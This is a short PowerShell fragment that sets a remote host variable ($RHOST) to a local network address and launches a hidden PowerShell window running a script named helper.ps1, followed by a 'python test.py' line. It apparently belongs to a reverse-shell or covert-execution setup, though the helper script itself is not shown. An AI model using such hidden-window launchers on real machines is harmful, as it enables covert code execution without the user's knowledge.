$RHOST = '192.168.0.24'

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command .\helper.ps1"

python test.py
